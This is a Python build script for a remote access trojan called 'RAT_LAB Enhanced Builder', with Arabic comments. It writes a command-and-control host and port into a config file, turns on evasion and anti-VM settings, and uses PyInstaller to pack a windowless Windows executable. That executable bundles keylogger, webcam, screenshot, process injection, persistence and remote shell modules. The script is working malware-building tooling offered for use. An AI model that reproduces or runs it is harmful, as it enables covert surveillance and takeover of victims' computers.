#!/usr/bin/env python3
# RAT_LAB Enhanced Builder

import subprocess
import os
import sys
import re
import shutil
import argparse

ROOT = os.path.dirname(os.path.abspath(__file__))
CONFIG = os.path.join(ROOT, "config_enhanced.py")
OUTPUT = os.path.join(ROOT, "output")

def build_enhanced(c2_host, c2_port, name="RAT_Client", obfuscate=True, evasion=True):
    """بناء العميل المحسّن"""
    print(f"\n[*] RAT_LAB Enhanced Builder")
    print(f"    C2: {c2_host}:{c2_port}")
    print(f"    Name: {name}.exe")
    print(f"    Evasion: {'ON' if evasion else 'OFF'}")
    print(f"    Obfuscate: {'ON' if obfuscate else 'OFF'}")
    
    # قراءة الإعدادات الأصلية
    with open(CONFIG, "r", encoding="utf-8") as f:
        original = f.read()
    
    # تعديل الإعدادات
    patched = original
    
    # C2 Host
    patched = re.sub(
        r'C2_HOST\s*=\s*"[^"]*"',
        f'C2_HOST = "{c2_host}"',
        patched,
    )
    
    # C2 Port
    patched = re.sub(
        r'C2_PORT\s*=\s*\d+',
        f'C2_PORT = {c2_port}',
        patched,
    )
    
    # Evasion
    patched = re.sub(
        r'ENABLE_EVASION\s*=\s*(True|False)',
        f'ENABLE_EVASION = {evasion}',
        patched,
    )
    
    # Anti-VM
    patched = re.sub(
        r'ANTI_VM\s*=\s*(True|False)',
        f'ANTI_VM = {evasion}',
        patched,
    )
    
    print("\n[*] Patching config_enhanced.py...")
    with open(CONFIG, "w", encoding="utf-8") as f:
        f.write(patched)
    
    try:
        # Hidden imports
        hidden_imports = [
            "customtkinter",
            "psutil",
            "PIL",
            "pycryptodome",
            "modules.evasion",
            "modules.injection",
            "modules.keylogger",
            "modules.screenshot",
            "modules.webcam",
            "modules.fileops",
            "modules.persistence",
            "modules.shell",
            "modules.process",
            "modules.network",
        ]
        
        # Build command
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--name", name,
            "--distpath", OUTPUT,
            "--workpath", os.path.join(ROOT, "build_temp"),
            "--specpath", os.path.join(ROOT, "build_temp"),
            "--add-data", "modules;modules",
            "--hidden-import", "customtkinter",
            "--hidden-import", "psutil",
            "--hidden-import", "PIL",
            "--hidden-import", "pycryptodome",
        ]
        
        # Add hidden imports
        for hi in hidden_imports:
            cmd.extend(["--hidden-import", hi])
        
        cmd.append(os.path.join(ROOT, "client.py"))
        
        print(f"[*] Running PyInstaller...")
        print(f"    {' '.join(cmd)}\n")
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            cwd=ROOT,
            timeout=300,
        )
        
        if result.returncode == 0:
            exe_path = os.path.join(OUTPUT, f"{name}.exe")
            if os.path.exists(exe_path):
                size_mb = os.path.getsize(exe_path) / (1024 * 1024)
                print(f"\n[✓] Build successful!")
                print(f"    Output: {exe_path}")
                print(f"    Size:   {size_mb:.1f} MB")
            else:
                print(f"\n[!] Build may have succeeded but exe not found")
        else:
            print(f"\n[✗] Build failed!")
            print(result.stderr[-1000:] if result.stderr else "No error output")
            return False
            
    finally:
        # Restore original config
        print("\n[*] Restoring config_enhanced.py...")
        with open(CONFIG, "w", encoding="utf-8") as f:
            f.write(original)
    
    # Cleanup
    build_temp = os.path.join(ROOT, "build_temp")
    if os.path.exists(build_temp):
        print("[*] Cleaning build artifacts...")
        shutil.rmtree(build_temp, ignore_errors=True)
    
    print("[✓] Done.\n")
    return True

def main():
    parser = argparse.ArgumentParser(description="RAT_LAB Enhanced Builder")
    parser.add_argument("--host", required=True, help="C2 server IP")
    parser.add_argument("--port", type=int, default=4444, help="C2 port")
    parser.add_argument("--name", default="RAT_Client", help="Output exe name")
    parser.add_argument("--no-evasion", action="store_true", help="Disable evasion")
    parser.add_argument("--no-obfuscate", action="store_true", help="Disable obfuscation")
    
    args = parser.parse_args()
    build_enhanced(
        c2_host=args.host,
        c2_port=args.port,
        name=args.name,
        obfuscate=not args.no_obfuscate,
        evasion=not args.no_evasion,
    )

if __name__ == "__main__":
    main()